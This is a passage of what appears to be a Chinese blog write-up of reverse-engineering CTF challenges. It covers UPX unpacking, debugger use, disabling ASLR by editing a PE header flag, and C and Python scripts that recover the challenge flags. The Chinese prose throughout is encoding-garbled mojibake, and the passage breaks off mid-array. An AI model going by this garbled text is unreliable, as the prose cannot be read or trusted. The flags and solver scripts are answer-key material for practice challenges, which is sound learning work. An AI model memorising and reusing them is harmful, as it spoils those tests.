å¼‚æˆ–è¿ç®—å¾—åˆ° å¾—åˆ°è¿™é‡Œçš„base64 çš„ç . ç„¶åè¿™ä¸ªç å»è§£ç åé¢ç”¨æ¥åšæ¯”è¾ƒçš„å­—ç¬¦,å¾—åˆ°ç¬¬ä¸€æ¬¡è½¬æ¢åçš„ç»“æœ. ä½†æ˜¯å¼‚æˆ–è¿ç®—å, æˆ‘ä»¬å‘ç°è¿™ä¸ªç å°±æ˜¯base64æ ‡å‡†ç .</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200429162141561-1590490034442-1591162136025.png" alt="image-20200429162141561-1590490034442"></p></li><li><p>æœ€å, çŸ¥é“å¼€å§‹æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿›è¡Œæ•°å€¼è½¬æ¢çš„, é‚£ä¹ˆæœ€åè§£ç åæˆ‘ä»¬ä¹Ÿè¦è¿˜åŸä¸€ä¸‹. æ‡’å¾—Cè¯­è¨€è‡ªå·±å†™äº†, ç”¨ python çš„ hex(). æœ€å flagå°±æ˜¯  <strong>ADEBDEAEC7BE</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s =  base64.b64decode(<span class="string">'reverse+'</span>)</span><br><span class="line"><span class="keyword">print</span> (type(s)) / åˆšå­¦python,æŸ¥çœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆç±»å‹,å› ä¸ºç”¨hex(), å‘ç° list, tupleéƒ½æ²¡æœ‰ hex().</span><br><span class="line"><span class="keyword">print</span> (s.hex().upper())</span><br></pre></td></tr></table></figure><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200501113755270-1590490003811-1591162636827.png" alt="image-20200501113755270-1590490003811"></p></li><li><p><strong>æ€»ç»“: 1.é¢˜ç›®æœ‰æ—¶å€™çœ‹èµ·æ¥ä»£ç å¾ˆå†—é•¿, ä½†é€»è¾‘ä¸éš¾çš„, ç»†å¿ƒåˆ†æä¸€ä¸‹.  è¦æ³¨æ„baseå®¶æ—çš„ç¼–ç ä¸è§£ç .   2.æ­£åœ¨å­¦ä¹ pythonä¸­, æ¯æ¬¡å†™pythonè„šæœ¬éƒ½æœ‰æ”¶è·.</strong></p></li></ul><table><thead><tr><th>å­—ç¬¦ä¸²å‰æ·»åŠ r , è¡¨ç¤ºåç»­çš„å­—ç¬¦ä¸²åŸæ ·è¾“å‡º, ä¸è¿›è¡Œè½¬ä¹‰. å¦‚ \\ è½¬ä¹‰åä¸º \</th></tr></thead><tbody><tr><td><strong>å­—ç¬¦ä¸²å‰æ·»åŠ b, åé¢å­—ç¬¦ä¸²æ˜¯bytes ç±»å‹</strong></td></tr><tr><td><strong>åœ¨ Python3 ä¸­ï¼Œbytes å’Œ str çš„äº’ç›¸è½¬æ¢æ–¹å¼æ˜¯:str.encode(â€˜utf-8â€™)   bytes.decode(â€˜utf-8â€™)</strong></td></tr></tbody></table><hr><h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h2><ul><li><p>é¦–å…ˆè¿™é“é¢˜ä¸ä¸Šé¢çš„ä¸€é“æ˜¯ä¸€èµ·çš„, åšäº†ä¸Šé¢çš„ä¸€é“é¢˜, è§‰å¾—åº”è¯¥è¿˜æ˜¯æœ‰å£³çš„, æŸ¥ä¸€ä¸‹æ˜¯ upx.</p></li><li><p>è½½å…¥ODè¿˜æ˜¯ä½¿ç”¨å †æ ˆå¹³è¡¡çš„åŸç†è„±å£³, å‘ç°åŒæ ·æ˜¯æ¯æ¬¡è½½å…¥çš„åœ°å€ä¸ä¸€æ ·, è„±å£³åè¿˜æ˜¯ä¸èƒ½è¿è¡Œ, è¿˜æ˜¯è¦ä¿®å¤è¾“å…¥è¡¨, ä½†import recåˆæ‰¾ä¸åˆ°æˆ‘ç”µè„‘çš„æ–‡ä»¶â€¦â€¦.å°±å…ˆæŠŠé¢˜åšäº†å†æ¥ç ”ç©¶.</p></li><li><p>idaè½½å…¥åååˆ†ç®€æ´. ä¸€ä¸ªåŠ å¯†å‡½æ•°åè¿›è¡Œåˆ¤æ–­. çœ‹åŠ å¯†å‡½æ•°.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200430190548596-1590490212309-1591162149285.png" alt="image-20200430190548596-1590490212309"></p></li><li><p>å› ä¸ºä¸Šé¢çš„ Reverse1 ä¹Ÿæ˜¯åˆåŒæ ·çš„é—®é¢˜(<strong>ä¸åŒçš„å˜é‡å¦‚ä½•è”ç³»åœ¨ä¸€èµ·çš„</strong>), å˜é‡åœ°å€æ˜¯ç›¸åŒçš„. å°±å…ˆçœ‹çœ‹ä¸Šé¢ <strong>v1çš„åœ°å€, å‘ç°æ˜¯ ecx ä¼ æ¥çš„</strong>, é‚£å†çœ‹çœ‹ä¸Šä¸€å±‚å‡½æ•°çš„ ecx . å‘ç°åœ¨è°ƒç”¨è¿™ä¸ªåŠ å¯†å‡½æ•°ä¹‹å‰æœ‰ä¸€ä¸ªecxèµ‹å€¼. <strong>è€Œè¦ç”¨æ¥æœ€åæ¯”è¾ƒçš„ v4å˜é‡, å®ƒçš„åœ°å€å’Œä¼ ç»™ecxæ˜¯ä¸€æ ·çš„</strong>.  <strong><em>é‚£è¿™é‡Œå°±æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„å‚æ•°.</em></strong></p></li><li><p>ä¸Šé¢çš„ä»£ç è§‰å¾—å¥‡æ€ª, æ€€ç–‘æ˜¯idaçš„åŸå› , æŠŠåŸç¨‹åºåˆ° OD åŠ¨æ€è°ƒè¯•çœ‹ä¸€ä¸‹åŠ å¯†å‡½æ•°.  æ¸…æ™°å¾ˆå¤š.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200430192452991-1590490227510-1591162179011.png" alt="image-20200430192452991-1590490227510"></p><p>æ‰€ä»¥è¿™ä¸ªå‡½æ•°å°±æ˜¯é€šè¿‡æˆ‘ä»¬è¾“å…¥çš„ASCIIä¸ºç´¢å¼•å€¼æ¥ä¾æ¬¡å–å‡ºç¼–ç å­—ç¬¦çš„æ•°æ®, æœ€å<strong>DDCTF{reverseME}</strong>è¿›è¡Œæ¯”è¾ƒ.</p></li><li><p>å¯ä»¥çœ‹åˆ°æ˜¯ä» 0x402FF8 ä¸ºé¦–åœ°å€å¼€å§‹ç´¢å¼•, ä½†æ˜¯ä»idaä¸­å¯ä»¥çŸ¥é“ å¯æ‰“å°å­—ç¬¦æ˜¯ä»0x403018å¼€å§‹çš„.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200430200350749-1590490244163-1591162185500.png" alt="image-20200430200350749-1590490244163"></p></li><li><p>æœ€å,æˆ‘é‡åˆ°çš„å¾ˆå¤§çš„å‘â€¦..ğŸ¤£, å­—ç¬¦ä¸²å¤åˆ¶ä¸‹æ¥å, æˆ‘æ²¡æœ‰å¤„ç†å…¶ä¸­çš„  \  çš„å­—ç¬¦, é‚£ä¹ˆå°±è¢«é»˜è®¤ä¸ºè½¬ä¹‰å­—ç¬¦äº†, å¯¼è‡´2ä¸ªå­—ç¬¦å˜æˆä¸€ä¸ª, æœ€åç»“æœè‚¯å®šé”™.  èŠ±äº†å¥½å¤šæ—¶é—´æ‰¾è¿™ä¸ªé”™è¯¯, è¿˜æ˜¯æ²¡æœ‰åœ¨ç»†èŠ‚ä¸Šæ³¨æ„ğŸ˜¢.   <strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(',27h,'&amp;%$#\"! "</span>; </span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"DDCTF&#123;reverseME&#125;"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(b); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a); j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] == b[i])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j + <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åšå®Œå,å¼€å§‹å»äº†è§£ <strong>ASLR</strong>, çŸ¥é“äº†å¼€å¯ASLRçš„PEæ–‡ä»¶ä¼šå¤šäº†ä¸€ä¸ª.relocèŠ‚åŒº, ä¸”IMAGE_OPTIONAL_HEADER32ç»“æ„ä¸­çš„DllCharacteristicså¤šäº†ä¸€ä¸ªå±æ€§. å¦‚æœä¸€ä¸ªç¨‹åºå¼€å¯äº†ASLRä¿æŠ¤, æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªDllCharacteristicsçš„å€¼ä»<strong>8140</strong>æ”¹ä¸º<strong>8100</strong>ä»è€Œå…³é—­ASLR.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200430204438115-1590490290134-1591162198441.png" alt="image-20200430204438115-1590490290134"></p></li><li><p><strong>æ€»ç»“: (1)ä¸€ä¸ªç¨‹åºä¸­çš„å‚æ•°å¯èƒ½ä¼šä»¥å¯„å­˜å™¨çš„æ¥ä¼ é€’ (2)å­—ç¬¦ä¸²ä¸­æ³¨æ„ \ å­—ç¬¦, è¦ç”¨ \\æ¥è¡¨ç¤º \ å­—ç¬¦. (3)ç¨‹åºçš„ASLRçš„å¼€å¯æ ‡å¿—åŠå…³é—­æ–¹æ³•.</strong> </p></li></ul><hr><h2 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h2><ul><li><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ— å£³. æ‰“å¼€ç¨‹åºçœ‹ä¸€ä¸‹.   æœç„¶æ˜¯ä¸€ä¸ªæ¸¸æˆ, ç®€å•çš„çœ‹äº†ä¸€ä¸‹, æ˜¯è®©æˆ‘ä»¬åœ¨è§„å®šæ—¶é—´è¾“å…¥å±å¹•ä¸Šæ˜¾ç¤ºçš„å­—ç¬¦. </p></li><li><p>idaæ‰“å¼€, çœ‹ä¼ªä»£ç , å¾ˆå†—é•¿,  å‘ä¸‹æµè§ˆä¸€ä¸‹å¯ä»¥çœ‹è§å¥½å‡ ä¸ªåˆ¤æ–­å‡½æ•°. ä¸”éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°, ç¨‹åºè‚¯å®šä¸åº”è¯¥æ˜¯é€€å‡º. æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©å®ƒçš„è¿”å›å€¼ä¸º <strong>é0</strong></p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200501104557726-1590490317124-1591162209414.png" alt="image-20200501104557726-1590490317124"></p></li><li><p>è¿›å…¥ sub_401507 çœ‹çœ‹. å‘ç°è¿˜æœ‰ä¸ªåˆ¤æ–­çš„åœ°æ–¹, <strong>æˆ‘ä»¬çš„ç›®çš„: è®©å®ƒè¿”å›1</strong> è®°å½•ä¸‹åœ°å€. <strong>0x00401563</strong>. <img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200501105251204-1590490324745-1591162219087.png" alt="image-20200501105251204-1590490324745"></p></li><li><p>æ­¤æ—¶ç¨‹åºä¸‹é¢è¿˜æœ‰ç±»ä¼¼çš„åˆ¤æ–­å‡½æ•°, é‚£ä¹ˆç›¸åŒçš„æ–¹æ³•, å…ˆæ‰¾åˆ°åœ°å€, è®°å½•ä¸‹æ¥.</p></li><li><p>æœ€åå‘ç°, ç¨‹åºçš„æ ¸å¿ƒåˆ¤æ–­å‡½æ•°å°±åªæœ‰2ä¸ª.  åœ°å€åˆ†åˆ«ä¸º:  <strong>0x00401563</strong> ,  <strong>0x004014DB</strong> </p></li><li><p>æŠŠç¨‹åºè½½å…¥OD. è·³åˆ°æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€, å‘ç°åœ°å€å¯¹ä¸ä¸Š, é‚£ç¨‹åºæ˜¯å¼€å¯äº† ASLR çš„, ä½†æ˜¯ RVA æ˜¯ä¸€æ ·çš„, ç®€å•çš„ç®—ä¸€ä¸‹å°±å¯ä»¥äº†.   å¦å¤–ä¸€ä¸ªåœ°å€, ç›¸åŒçš„æ“ä½œ.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200501110440340-1590490372567-1591162227662.png" alt="image-20200501110440340-1590490372567"></p></li><li><p>æœ€åF9è¿è¡Œ, æ¸¸æˆè¿›è¡Œä¸€æ®µæ—¶é—´, å‡ºç°flag. <img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200501110942866-1591162259944.png" alt="image-20200501110942866"></p></li><li><p><strong>æ€»ç»“: ç®€å•çš„åŠ¨æ€è°ƒè¯•çš„åº”ç”¨, æ³¨æ„åœ°å€æ˜¯ä¸æ˜¯ image base.</strong></p></li></ul><hr><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><ul><li><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ˜¯ upx. è½½å…¥OD, å‡†å¤‡è„±å£³, ä½†æ˜¯å‘ç° <strong>VA</strong> ä¸æ˜¯é»˜è®¤åŠ è½½çš„0x400000, åº”è¯¥æ˜¯å¼€å¯äº† ASLR.  è½¬åˆ°010editor,æ‰¾åˆ° <strong>struct DLL_CHARACTERISTICS DllCharacteristics</strong>, å°†8140æ”¹ä¸º8100.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200502082437777-1590490407479-1591162332414.png" alt="image-20200502082437777-1590490407479"></p></li><li><p>æ¥ä¸‹æ¥, é‡æ–°è½½å…¥OD,ä½¿ç”¨å †æ ˆå¹³è¡¡æ‰¾åˆ°ç¨‹åº EOP, ç„¶å dump.</p></li><li><p>è„±å£³åè½½å…¥IDA, ç¨‹åºé€»è¾‘ç®€å•, é¦–å…ˆé™åˆ¶é•¿åº¦ &lt;= 37, ç„¶åä¸€ä¸ªåˆ¤æ–­å‡½æ•°, æˆ‘ä»¬è¿›å…¥: ç®—æ³•ä¹Ÿä¸éš¾.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200502083116266-1590490428595-1591162345446.png" alt="image-20200502083116266-1590490428595"></p></li><li><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;</span><br><span class="line">   <span class="number">50</span>,  <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = &#123;</span><br><span class="line">   <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;</span><br><span class="line">   <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>,  <span class="number">72</span>,   <span class="number">0</span>,   <span 